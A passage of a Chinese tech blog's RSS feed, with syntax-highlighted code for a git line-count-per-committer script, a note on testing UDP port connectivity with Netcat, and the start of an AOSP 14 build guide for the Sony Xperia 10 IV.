<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    env[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'PKEY'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66"> GITLAB_CLONE_METHOD</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    subprocess.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">([</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'git'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'clone'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'--no-checkout'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, clone_url], </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">env</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">env)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> walk_dir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 获取当前目录下的所有Git仓库</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    repo_dirs </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> d </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">listdir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'.'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> os.path.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">isdir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(d) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '.git'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">listdir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(d):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            repo_dirs.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">append</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(d)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> repo_dirs</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> get_commit_lines</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic">repo_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    repo </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> Repo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(repo_path)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    commits </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(repo.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">iter_commits</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">())</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    last_commit </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> commits[</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    total_lines_added </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> last_commit.stats.total[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'lines'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> total_lines_added</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> get_all_committers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic">repo_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    repo </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> Repo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(repo_path)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    committers </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> set</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> commit </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> repo.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">iter_commits</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        committers.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">add</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(commit.author.name)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> committers</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> count_lines_per_committer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic">repo_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    repo </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> Repo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(repo_path)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    committers </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> get_all_committers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(repo_path)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    lines_per_committer </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> committer </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> committers:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        total_lines </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> commit </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> repo.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">iter_commits</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">            if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> commit.author.name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> committer:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                total_lines </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> commit.stats.total[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'lines'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        lines_per_committer[committer] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> total_lines</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> committer </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> merge_dict:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            merge_dict[committer] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> merge_dict[committer] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> total_lines</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            merge_dict[committer] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> total_lines</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> lines_per_committer</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> calc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic">repo_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    lines_per_committer </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> count_lines_per_committer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(repo_path)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> lines_per_committer</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> walk_dir</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(i)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">calc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(i))</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">dict</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">sorted</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(merge_dict.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">items</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(), </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">key</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">lambda</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic"> item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: item[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">], </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">reverse</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">True</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)))</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # repositories = get_gitlab_repositories()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # for repository in repositories:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    #     clone_repository(repository)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">    main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>使用Netcat检测UDP端口连通性</title>
      <link>https://www.geekery.cn/note-book/LinuxOperaSystem/%E4%BD%BF%E7%94%A8Netcat%E6%A3%80%E6%B5%8BUDP%E7%AB%AF%E5%8F%A3%E8%BF%9E%E9%80%9A%E6%80%A7.html</link>
      <guid>https://www.geekery.cn/note-book/LinuxOperaSystem/%E4%BD%BF%E7%94%A8Netcat%E6%A3%80%E6%B5%8BUDP%E7%AB%AF%E5%8F%A3%E8%BF%9E%E9%80%9A%E6%80%A7.html</guid>
      <source url="https://www.geekery.cn/rss.xml">使用Netcat检测UDP端口连通性</source>
      <description>使用Netcat检测UDP端口连通性 在进行网络故障排查或者服务器性能优化的过程中，可能需要检测特定的 UDP 端口是否处于开放状态。本文记录了nc检测方法。 Netcat 是一个简单但强大的网络工具，它可以读取和写入 TCP 或 UDP 数据流。这里是如何使用 Netcat 来测试一个 UDP 端口是否打开的步骤 在目标服务器上启动监听 这里 -l ...</description>
      <pubDate>Wed, 28 Aug 2024 09:20:17 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>在进行网络故障排查或者服务器性能优化的过程中，可能需要检测特定的 UDP 端口是否处于开放状态。本文记录了nc检测方法。</p>
</blockquote>
<p>Netcat 是一个简单但强大的网络工具，它可以读取和写入 TCP 或 UDP 数据流。这里是如何使用 Netcat 来测试一个 UDP 端口是否打开的步骤</p>
<h2>在目标服务器上启动监听</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 12345</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里 <code>-l</code> 选项是告诉 Netcat 在指定端口上监听，而 <code>-u</code> 选项是让 Netcat 使用 UDP 而不是默认的 TCP。</p>
<h2>从另一台机器发送UDP数据包</h2>
<p>在另一台可以访问目标服务器的机器上，运行以下命令</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "test message"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">target-i</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">p&gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">12345</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在这个命令中，<code>&lt;target-ip&gt;</code> 需要替换为目标服务器的 IP 地址，<code>12345</code> 是你要测试的端口号。<code>echo -n "test message"</code> 是发送到目标服务器的消息内容。</p>
<h2>查看结果</h2>
<p>如果UDP端口是开放的，并且没有被防火墙阻止，那么在第一步中启动的Netcat实例应该会显示接收到的"test message"。</p>
<p>请注意，这种测试方法只能工作在网络中没有防火墙阻挡 UDP 传输的情况下。如果有防火墙阻挡，那么你需要在防火墙中打开相应的 UDP 端口，或者使用其他方法进行测试。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Sony Xperia 10 IV(pdx225)AOSP14编译和刷机方法</title>
      <link>https://www.geekery.cn/note-book/Android/Sony%20Xperia%2010%20IV(pdx225)AOSP14%E7%BC%96%E8%AF%91%E5%92%8C%E5%88%B7%E6%9C%BA%E6%96%B9%E6%B3%95.html</link>
      <guid>https://www.geekery.cn/note-book/Android/Sony%20Xperia%2010%20IV(pdx225)AOSP14%E7%BC%96%E8%AF%91%E5%92%8C%E5%88%B7%E6%9C%BA%E6%96%B9%E6%B3%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Sony Xperia 10 IV(pdx225)AOSP14编译和刷机方法</source>
      <description>Sony Xperia 10 IV(pdx225)AOSP14编译和刷机方法 编译机环境准备 清理环境 安装jdk 经过测试，大版本一致即可 安装依赖 下载源码 官方参考链接： https://developer.sony.com/open-source/aosp-on-xperia-open-devices/guides/aosp-build-ins...</description>
      <pubDate>Mon, 26 Aug 2024 07:06:50 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>编译机环境准备</h2>
<h3>清理环境</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> purge</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openjdk-</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icedtea-</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icedtea6-</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>安装jdk</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openjdk-11-jdk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">java</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -version</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">openjdk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "11.0.20.1"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2023-08-24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Environment</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">11.0.20.1+1-post-Ubuntu-0ubuntu120.04</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 64-Bit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> VM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">11.0.20.1+1-post-Ubuntu-0ubuntu120.04,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mixed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sharing</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>经过测试，大版本一致即可</p>
<h3>安装依赖</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bison</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g++-multilib</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gperf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libxml2-utils</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> make</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib1g-dev:i386</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> liblz4-tool</span><span 